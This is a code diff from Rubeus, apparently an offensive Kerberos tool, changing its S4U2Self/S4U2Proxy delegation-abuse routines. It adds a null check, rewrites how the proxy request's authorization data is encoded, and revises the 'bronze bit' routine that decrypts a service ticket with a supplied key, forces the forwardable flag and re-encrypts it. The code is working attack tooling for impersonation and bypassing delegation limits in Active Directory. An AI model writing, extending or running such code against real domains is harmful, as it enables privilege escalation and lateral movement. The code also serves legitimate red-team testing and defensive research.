@@ -76,6 +76,11 @@ namespace Rubeus
                     else
                     {
                         self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, s, opsec, bronzebit, keyString, encType);
+                        if (self == null)
+                        {
+                            Console.WriteLine("[X] S4U2Self failed, unable to perform S4U2Proxy.");
+                            return;
+                        }
                     }
                     if (String.IsNullOrEmpty(targetSPN) == false)
                     {
@@ -171,13 +176,14 @@ namespace Rubeus
                     byte[] tgsKey = tgs.enc_part.ticket_info[0].key.keyvalue;
                     Interop.KERB_ETYPE tgsEtype = (Interop.KERB_ETYPE)tgs.enc_part.ticket_info[0].key.keytype;
 
-                    List<AuthorizationData> tmp = new List<AuthorizationData>();
-                    AuthorizationData restrictions = new AuthorizationData(Interop.AuthorizationDataType.KERB_AUTH_DATA_TOKEN_RESTRICTIONS);
-                    AuthorizationData kerbLocal = new AuthorizationData(Interop.AuthorizationDataType.KERB_LOCAL);
-                    tmp.Add(restrictions);
-                    tmp.Add(kerbLocal);
-                    AuthorizationData authorizationData = new AuthorizationData(tmp);
-                    byte[] authorizationDataBytes = authorizationData.Encode().Encode();
+                    ADIfRelevant ifrelevant = new ADIfRelevant();
+                    ADRestrictionEntry restrictions = new ADRestrictionEntry();
+                    ADKerbLocal kerbLocal = new ADKerbLocal();
+                    ifrelevant.ADData.Add(restrictions);
+                    ifrelevant.ADData.Add(kerbLocal);
+                    AsnElt authDataSeq = ifrelevant.Encode();
+                    authDataSeq = AsnElt.Make(AsnElt.SEQUENCE, authDataSeq);
+                    byte[] authorizationDataBytes = authDataSeq.Encode();
                     byte[] enc_authorization_data = Crypto.KerberosEncrypt(tgsEtype, Interop.KRB_KEY_USAGE_TGS_REQ_ENC_AUTHOIRZATION_DATA, tgsKey, authorizationDataBytes);
                     s4u2proxyReq.req_body.enc_authorization_data = new EncryptedData((Int32)tgsEtype, enc_authorization_data);
                 }
@@ -495,20 +501,18 @@ namespace Rubeus
                     byte[] key = Helpers.StringToByteArray(keyString);
 
                     // decrypt and decode ticket encpart
-                    outBytes = Crypto.KerberosDecrypt(encType, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, rep.ticket.enc_part.cipher);
-                    ae = AsnElt.Decode(outBytes, false);
-                    EncTicketPart decTicketPart = new EncTicketPart(ae.Sub[0]);
+                    var decTicketPart = rep.ticket.Decrypt(key, null, true);
 
                     // modify flags
                     decTicketPart.flags |= Interop.TicketFlags.forwardable;
 
                     // encode and encrypt ticket encpart
                     byte[] encTicketData = decTicketPart.Encode().Encode();
-                    byte[] encTicketPart = Crypto.KerberosEncrypt(encType, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);
-                    rep.ticket.enc_part = new EncryptedData((Int32)encType, encTicketPart, rep.ticket.enc_part.kvno);
+                    byte[] encTicketPart = Crypto.KerberosEncrypt((Interop.KERB_ETYPE)rep.ticket.enc_part.etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);
+                    rep.ticket.enc_part = new EncryptedData(rep.ticket.enc_part.etype, encTicketPart, rep.ticket.enc_part.kvno);
                     Console.WriteLine("[*] Flags changed to: {0}", info.flags);
                 }
-                
+
                 // add the ticket
                 cred.tickets.Add(rep.ticket);
 
